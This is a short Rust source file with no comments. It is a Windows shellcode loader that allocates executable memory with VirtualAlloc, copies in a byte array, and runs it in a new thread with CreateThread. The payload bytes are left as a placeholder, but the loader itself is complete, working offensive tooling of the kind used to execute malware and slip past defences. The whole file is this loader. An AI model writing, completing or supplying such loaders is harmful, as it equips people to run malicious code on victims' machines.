extern crate winapi;

use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::processthreadsapi::CreateThread;
use winapi::um::synchapi::WaitForSingleObject;
use winapi::um::winnt::{MEM_COMMIT, PAGE_EXECUTE_READWRITE};
use std::ptr::null_mut;

fn main() {
    let x64shellcode: &[u8] = &[SHELLCODE HERE];
    let shellcode_len = x64shellcode.len();
    unsafe {
        let func_addr = VirtualAlloc(null_mut(), shellcode_len, MEM_COMMIT,PAGE_EXECUTE_READWRITE,);
        if func_addr.is_null() {
            panic!("Memory allocation failed.");
        }
        std::ptr::copy_nonoverlapping(x64shellcode.as_ptr(), func_addr as *mut u8, shellcode_len);
        let mut thread_id: u32 = 0;
        let h_thread = CreateThread(null_mut(), 0, Some(std::mem::transmute(func_addr)), null_mut(), 0, &mut thread_id as *mut u32,);

        if h_thread.is_null() {
            panic!("Thread creation failed.");
        }
        WaitForSingleObject(h_thread, 0xFFFFFFFF);
    }
}
